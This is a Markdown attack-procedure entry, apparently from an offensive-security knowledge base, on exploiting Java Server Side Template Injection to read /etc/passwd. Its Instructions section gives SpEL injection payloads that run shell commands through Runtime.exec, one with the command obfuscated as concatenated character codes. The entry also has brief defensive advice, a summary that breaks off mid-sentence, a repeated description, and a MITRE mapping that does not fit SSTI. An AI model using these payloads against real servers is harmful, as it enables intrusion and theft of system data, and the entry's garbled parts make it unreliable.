---
id: 1e731ab9-d9f4-443a-90e4-73ba80ef8732
name: Java Server Side Template Injection for Retrieving /etc/passwd
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:39.354666+00:00'
updated_at: '2023-04-10T20:23:40.023083+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[Java]]'
- '[[Java - Retrieve /etc/passwd]]'
- '[[Server Side Template Injection]]'
---

# Java Server Side Template Injection for Retrieving /etc/passwd

## Summary

This procedure involves exploiting a Server Side Template Injection vulnerability in a Java application to retrieve the /etc/passwd file. An attacker can use this information to gain a better understanding of the target system and its users. Server Side Template Injection vulnerabilities occur when

## Description

# Description

This procedure involves exploiting a Server Side Template Injection vulnerability in a Java application to retrieve the /etc/passwd file. An attacker can use this information to gain a better understanding of the target system and its users. Server Side Template Injection vulnerabilities occur when user input is not properly sanitized and is directly included in a template that is later rendered on the server. By injecting malicious code into the template, an attacker can execute arbitrary code on the server, allowing them to read sensitive files such as /etc/passwd.

Technical Explanation: Java applications that use server-side templates are vulnerable to Server Side Template Injection if they do not properly sanitize user input. This vulnerability can be exploited by injecting malicious code into the template, which is then executed on the server. By doing so, an attacker can execute arbitrary code on the server and read sensitive files such as /etc/passwd.

Business Value: An attacker can use the information retrieved from /etc/passwd to gain a better understanding of the target system and its users. This information can be used to launch further attacks, such as password guessing or phishing attacks.

## Requirements

1. Access to the vulnerable Java application

1. Knowledge of the Server Side Template Injection vulnerability

1. Ability to inject code into the template

## Defense

1. Properly sanitize user input in server-side templates to prevent Server Side Template Injection vulnerabilities

1. Implement access controls to limit the amount of information that can be retrieved from sensitive files such as /etc/passwd

1. Regularly update and patch vulnerable Java applications to prevent exploitation

## Objectives

1. Retrieve the /etc/passwd file from the target system

# Instructions

1. Use the following command to read the /etc/passwd file:

'${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}'

**Code**: [[${T(java.lang.Runtime).getRuntime().exec('cat etc/]]

> This command will execute a shell command that will read the /etc/passwd file and then convert the output to a string using the IOUtils class. The resulting string will contain the contents of the /etc/passwd file.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Template Injection|T1221 - Template Injection]]

## Tags

- [[Java]]
- [[Java - Retrieve /etc/passwd]]
- [[Server Side Template Injection]]
